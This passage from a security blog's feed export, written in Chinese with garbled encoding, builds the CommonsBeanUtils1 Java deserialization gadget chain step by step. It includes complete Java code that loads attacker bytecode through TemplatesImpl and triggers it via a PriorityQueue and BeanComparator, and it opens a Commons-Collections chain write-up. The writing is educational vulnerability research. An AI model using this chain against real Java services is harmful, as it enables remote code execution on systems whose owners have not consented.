<h3 id="TemplatesImplè°ƒç”¨é“¾"><a href="#TemplatesImplè°ƒç”¨é“¾" class="headerlink" title="TemplatesImplè°ƒç”¨é“¾"></a>TemplatesImplè°ƒç”¨é“¾</h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">TemplatesImpl#</span><span class="language-bash">getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">TemplatesImpl#</span><span class="language-bash">getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">TransletClassLoader#defineClass()</span><br></code></pre></td></tr></table></figure>

<p>æ‰€ä»¥<code>PropertyUtils.getProperty(o1, property)</code>è¿™æ®µä»£ç ï¼Œå½“o1æ˜¯ä¸€ä¸ª <code>TemplatesImpl</code>å¯¹ è±¡ï¼Œè€Œ property çš„å€¼ä¸º<code>outputProperties</code>æ—¶ï¼Œå°†ä¼šè‡ªåŠ¨è°ƒç”¨getterï¼Œä¹Ÿå°±æ˜¯ <code>TemplatesImpl.getOutputProperties()</code>æ–¹æ³•ï¼Œè§¦å‘ä»£ç æ‰§è¡Œã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240606220701527.png" alt="image-20240606220701527"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.System.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>		<span class="hljs-comment">//TemplatesImpl3åæ®µä»£ç æ‰§è¡Œéƒ¨åˆ†</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        PropertyUtils.getProperty(templates,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ¥ç€å°±æ˜¯æ‰¾åœ¨å“ªè°ƒç”¨äº†<code>getProperty()</code>,åœ¨<code>BeanComparator.compare()</code>ä¸­æ‰¾åˆ°äº†è°ƒç”¨<code>getProperty()</code>çš„åœ°æ–¹</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240607184303226.png" alt="image-20240607184303226"></p>
<p><code>compare()</code>æˆ‘ä»¬ä¹Ÿå¾ˆç†Ÿæ‚‰äº†ï¼Œåœ¨<a href="https://sp4rks3.github.io/2024/06/01/JAVA%E5%AE%89%E5%85%A8/CC4/">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡-CC4</a>æœ‰æåˆ°compareï¼Œcompareçš„æ–¹æ³•è°ƒç”¨æ˜¯è¿™æ ·çš„</p>
<p><img src="https://image.sp4rks.xyz/2024/06/6.png" alt="6"></p>
<h3 id="é“¾å­æµç¨‹"><a href="#é“¾å­æµç¨‹" class="headerlink" title="é“¾å­æµç¨‹"></a>é“¾å­æµç¨‹</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">PriorityQueue.readObject()<br>	PriorityQueue.heapify()<br>		PriorityQueue.siftDown()<br>			PriorityQueue.siftDownUsingComparator()<br>				BeanComparator.compare()<br>					PropertyUtils.getProperty(TemplatesImpl, outputProperties)<br>    <br>						TemplatesImpl.getOutputProperties()<br>							TemplatesImpl.newTransformer()<br>								TemplatesImpl.getTransletInstance()<br>									TemplatesImpl.defineTransletClasses()<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/06/CB1.png" alt="CB1"></p>
<h2 id="CommonsBeanUtilsé“¾å®ç°"><a href="#CommonsBeanUtilsé“¾å®ç°" class="headerlink" title="CommonsBeanUtilsé“¾å®ç°"></a>CommonsBeanUtilsé“¾å®ç°</h2><p>å°è¯•æŒ‰ç…§ä¸Šé¢çš„é€»è¾‘å†™</p>
<h3 id="æœªæ‰¾åˆ°æ–¹æ³•çš„é”™è¯¯"><a href="#æœªæ‰¾åˆ°æ–¹æ³•çš„é”™è¯¯" class="headerlink" title="æœªæ‰¾åˆ°æ–¹æ³•çš„é”™è¯¯"></a>æœªæ‰¾åˆ°æ–¹æ³•çš„é”™è¯¯</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//TemplatesImpl3åæ®µä»£ç æ‰§è¡Œéƒ¨åˆ†</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><span class="hljs-comment">//        PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);</span><br>        <br>        <span class="hljs-comment">//CBçš„éƒ¨åˆ†</span><br>        BeanComparator&lt;Object&gt; beanComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>&lt;&gt;(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>		<br>		<span class="hljs-comment">//CC4çš„é€»è¾‘éƒ¨åˆ†</span><br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(beanComparator);<br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>æŠ¥é”™ä¿¡æ¯</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">NoSuchMethodException: java.lang.NoSuchMethodException: Unknown property <span class="hljs-string">&#x27;outputProperties&#x27;</span> on class <span class="hljs-string">&#x27;class java.lang.Integer&#x27;</span><br></code></pre></td></tr></table></figure>

<p>è·Ÿè¿›æŠ¥é”™ä¿¡æ¯</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240607223017391.png" alt="image-20240607223017391"></p>
<p>å¯¹2(Interger)è¿™ä¸ªå¯¹è±¡è°ƒç”¨outputPropertiesï¼Œé‚£è‚¯å®šæ²¡æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œé‚æŠ¥é”™</p>
<p>ä¿®æ”¹æƒ³æ³•ï¼š</p>
<p>å°†</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">priorityQueue.<span class="hljs-built_in">add</span>(templates);<br>priorityQueue.<span class="hljs-built_in">add</span>(2);<br></code></pre></td></tr></table></figure>

<p>å˜ä¸º</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">priorityQueue.<span class="hljs-built_in">add</span>(templates);<br>priorityQueue.<span class="hljs-built_in">add</span>(templates);<br></code></pre></td></tr></table></figure>

<p>ä½†æ˜¯åˆæœ‰ä¸ªé—®é¢˜ï¼Œå› ä¸ºaddä¼šè§¦å‘compareï¼Œå¯¼è‡´åºåˆ—åŒ–çš„æ—¶å€™å°±èµ°å®Œé“¾å­</p>
<p>æ‰€ä»¥å’±ä»¬å…ˆå¾—è®©é“¾å­æ–­å¼€ï¼Œaddå®Œä¹‹åï¼Œåºåˆ—åŒ–ä¹‹å‰é€šè¿‡åå°„å†å°†é“¾å­è¿æ¥èµ·æ¥</p>
<p>ä¿®æ”¹åï¼š</p>
<h3 id="å¯¹è±¡æ¯”è¾ƒé”™è¯¯"><a href="#å¯¹è±¡æ¯”è¾ƒé”™è¯¯" class="headerlink" title="å¯¹è±¡æ¯”è¾ƒé”™è¯¯"></a>å¯¹è±¡æ¯”è¾ƒé”™è¯¯</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//TemplatesImpl3åæ®µä»£ç æ‰§è¡Œéƒ¨åˆ†</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>		<span class="hljs-comment">//PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);</span><br>        <br>        <span class="hljs-comment">//CBçš„éƒ¨åˆ†</span><br>        BeanComparator&lt;Object&gt; beanComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>&lt;&gt;(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>		<span class="hljs-comment">//ä¸å¡«beanComparatorï¼Œæ–­å¼€é“¾å­</span><br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;();<br>        priorityQueue.add(templates);<br>        priorityQueue.add(templates);<br>		<br>		<span class="hljs-comment">//åå°„ä¿®æ”¹comparator</span><br>        Class&lt;PriorityQueue&gt; c = PriorityQueue.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">cDeclaredField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        cDeclaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        cDeclaredField.set(priorityQueue, beanComparator);<br><br><br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>é”™è¯¯ä¿¡æ¯ <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl cannot be cast to java.lang.Comparable</code> æ„å‘³ç€ <code>PriorityQueue</code> ä¸­çš„ <code>TemplatesImpl</code> å¯¹è±¡åœ¨æ’å…¥æ—¶æ— æ³•è¿›è¡Œæ¯”è¾ƒã€‚<code>PriorityQueue</code> éœ€è¦æ‰€æœ‰å…ƒç´ å®ç° <code>Comparable</code> æ¥å£æˆ–è€…éœ€è¦ä¸€ä¸ª <code>Comparator</code> æ¥å¯¹å…ƒç´ è¿›è¡Œæ¯”è¾ƒã€‚</p>
<p>ä¿®æ”¹æƒ³æ³•ï¼š</p>
<p>æ—¢ç„¶templatesä¸èƒ½æ¯”è¾ƒï¼Œé‚£å°±æ¢æˆæ•°å­—ï¼Œè¿™æ€»å¯ä»¥æ¯”è¾ƒå§</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">priorityQueue.<span class="hljs-built_in">add</span>(1);<br>priorityQueue.<span class="hljs-built_in">add</span>(2);<br></code></pre></td></tr></table></figure>

<p>å¯æ˜¯åˆä¼šå‡ºç°åˆšåˆšä¸èƒ½æ‰¾åˆ°outputPropertiesæ–¹æ³•çš„é—®é¢˜ï¼Œæ‰€ä»¥addå®Œä¹‹åï¼Œåºåˆ—åŒ–ä¹‹å‰è¦å°†<code>priorityQueue.add(1);</code>æ¢æˆ<code>priorityQueue.add(templates)</code></p>
<h3 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//TemplatesImpl3åæ®µä»£ç æ‰§è¡Œéƒ¨åˆ†</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//CBéƒ¨åˆ†</span><br>        BeanComparator&lt;Object&gt; beanComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>&lt;&gt;(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br><br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;();<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>		<span class="hljs-comment">//åå°„ä¿®æ”¹comparatorå’Œqueue</span><br>        Class&lt;PriorityQueue&gt; c = PriorityQueue.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparatorField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparatorField.setAccessible(<span class="hljs-literal">true</span>);<br>        comparatorField.set(priorityQueue, beanComparator);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">queueField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        queueField.setAccessible(<span class="hljs-literal">true</span>);<br>        Object[] queue = (Object[]) queueField.get(priorityQueue);<br>        queue[<span class="hljs-number">0</span>] = templates;<br><br><br><span class="hljs-comment">//        serialize(priorityQueue);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>ä¸ºä»€ä¹ˆä¿®æ”¹ <code>queue</code> å¯ä»¥æ”¹å˜ <code>PriorityQueue</code> çš„è¡Œä¸º</p>
<p><code>PriorityQueue</code> å†…éƒ¨ä½¿ç”¨æ•°ç»„æ¥å­˜å‚¨å…ƒç´ ï¼Œè€Œè¿™ä¸ªæ•°ç»„çš„å¼•ç”¨è¢«ä¿å­˜åœ¨ <code>queue</code> å­—æ®µä¸­ã€‚</p>
<p>é€šè¿‡åå°„ï¼Œè·å–äº† <code>PriorityQueue</code> ä¸­ <code>queue</code> å­—æ®µçš„å¼•ç”¨ï¼Œå¹¶ä¸”ç›´æ¥ä¿®æ”¹äº†å®ƒï¼Œå°† <code>TemplatesImpl</code> å¯¹è±¡æ·»åŠ åˆ°äº†é˜Ÿåˆ—çš„ç¬¬ä¸€ä¸ªä½ç½®ã€‚</p>
<h2 id="å‚è€ƒè¿æ¥"><a href="#å‚è€ƒè¿æ¥" class="headerlink" title="å‚è€ƒè¿æ¥"></a>å‚è€ƒè¿æ¥</h2><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">JavaBean</a></p>
<p><a href="https://www.bilibili.com/video/BV1uf4y1T7Rq/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Shiroååºåˆ—åŒ–æ¼æ´(ä¸‰)-shiroæ— ä¾èµ–åˆ©ç”¨é“¾</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html">CommonsBeanutilsä¸æ— commons-collectionsçš„Shiroååºåˆ—åŒ–åˆ©ç”¨</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVAå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaååºåˆ—åŒ–CommonsCollectionsç¯‡-CC1</title>
    <url>/2024/05/23/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC1/</url>
    <content><![CDATA[<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><ul>
<li><p>JAVAç‰ˆæœ¬8u65</p>
</li>
<li><p>commons-collections 3.2.1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;dependencies&gt;<br>        &lt;dependency&gt;<br>            &lt;groupId&gt;commons-collections&lt;/groupId&gt;<br>            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;<br>            &lt;version&gt;<span class="hljs-number">3.2</span><span class="hljs-number">.1</span>&lt;/version&gt;<br>        &lt;/dependency&gt;<br>&lt;/dependencies&gt;<br></code></pre></td></tr></table></figure></li>
</ul>
<h2 id="Common-Collections-ä»‹ç»"><a href="#Common-Collections-ä»‹ç»" class="headerlink" title="Common-Collections ä»‹ç»"></a>Common-Collections ä»‹ç»</h2><p><a href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">Apache Commons CollectionsåŒ…å’Œç®€ä»‹</a></p>
<ul>
<li><p><code>org.apache.commons.collections</code> â€“ CommonsCollectionsè‡ªå®šä¹‰çš„ä¸€ç»„å…¬ç”¨çš„æ¥å£å’Œå·¥å…·ç±»</p>
</li>
<li><p><code>org.apache.commons.collections.bag</code> â€“ å®ç°Bagæ¥å£çš„ä¸€ç»„ç±»</p>
</li>
<li><p><code>org.apache.commons.collections.bidimap</code> â€“ å®ç°BidiMapç³»åˆ—æ¥å£çš„ä¸€ç»„ç±»</p>
</li>
<li><p><code>org.apache.commons.collections.buffer</code> â€“ å®ç°Bufferæ¥å£çš„ä¸€ç»„ç±»</p>
</li>
<li><p><code>org.apache.commons.collections.collection</code> â€“å®ç°java.util.Collectionæ¥å£çš„ä¸€ç»„ç±»</p>
</li>
<li><p><code>org.apache.commons.collections.comparators</code>â€“ å®ç°java.util.Comparatoræ¥å£çš„ä¸€ç»„ç±»</p>
</li>
